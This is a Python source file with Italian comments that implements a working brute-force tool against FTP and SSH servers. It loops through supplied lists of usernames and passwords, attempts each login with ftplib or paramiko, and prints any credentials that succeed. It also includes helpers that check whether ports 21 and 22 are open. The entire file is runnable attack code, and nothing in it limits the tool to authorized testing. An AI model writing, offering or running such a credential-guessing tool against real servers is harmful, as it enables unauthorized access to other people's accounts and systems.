import socket
from ftplib import FTP
import paramiko

class BruteForceFTP:
    def __init__(self, server, username=None, passwords=None, usernames=None):
        self.server = server
        self.username = username
        self.passwords = passwords
        self.usernames = usernames
        self.found = False

    def attempt_login(self, username, password):
        """Tenta il login con un nome utente e una password specifica per FTP."""
        if self.found:
            return

        try:
            ftp = FTP(timeout=1)  # Timeout breve per connessioni più rapide
            ftp.connect(self.server)
            ftp.login(user=username, passwd=password)
            self.found = True
            print(f"[SUCCESS] Login riuscito con: {username}:{password}")
            ftp.quit()
        except Exception as e:
            print(f"[FAILED] Tentativo fallito con: {username}:{password}")
            pass  # Ignora errori per evitare ritardi inutili

    def start(self):
        """Avvia il brute force, provando le combinazioni di username e password per FTP."""
        if self.username:  # Se l'utente conosce il nome utente
            for password in self.passwords:
                if self.found:
                    break  # Se una password è stata trovata, interrompi il loop
                self.attempt_login(self.username, password)
        else:  # Se l'utente non conosce il nome utente
            for username in self.usernames:
                for password in self.passwords:
                    if self.found:
                        break  # Se una password è stata trovata, interrompi il loop
                    self.attempt_login(username, password)

        if not self.found:
            print("[INFO] Nessuna password trovata.")

def is_server_reachable_ftp(server):
    """Verifica se il server è raggiungibile sulla porta FTP (21)."""
    try:
        sock = socket.create_connection((server, 21), timeout=1)
        sock.close()
        return True
    except (socket.timeout, socket.error):
        return False

class BruteForceSSH:
    def __init__(self, server, username=None, passwords=None, usernames=None):
        self.server = server
        self.username = username
        self.passwords = passwords
        self.usernames = usernames
        self.found = False

    def attempt_login(self, username, password):
        """Tenta il login con un nome utente e una password specifica per SSH."""
        if self.found:
            return

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.server, username=username, password=password, timeout=1)
            self.found = True
            print(f"[SUCCESS] Login riuscito con: {username}:{password}")
            ssh.close()
        except Exception as e:
            print(f"[FAILED] Tentativo fallito con: {username}:{password}")
            pass  # Ignora errori per evitare ritardi inutili

    def start(self):
        """Avvia il brute force, provando le combinazioni di username e password per SSH."""
        if self.username:  # Se l'utente conosce il nome utente
            for password in self.passwords:
                if self.found:
                    break  # Se una password è stata trovata, interrompi il loop
                self.attempt_login(self.username, password)
        else:  # Se l'utente non conosce il nome utente
            for username in self.usernames:
                for password in self.passwords:
                    if self.found:
                        break  # Se una password è stata trovata, interrompi il loop
                    self.attempt_login(username, password)

        if not self.found:
            print("[INFO] Nessuna password trovata.")

def is_server_reachable_ssh(server):
    """Verifica se il server è raggiungibile sulla porta SSH (22)."""
    try:
        sock = socket.create_connection((server, 22), timeout=1)
        sock.close()
        return True
    except (socket.timeout, socket.error):
        return False
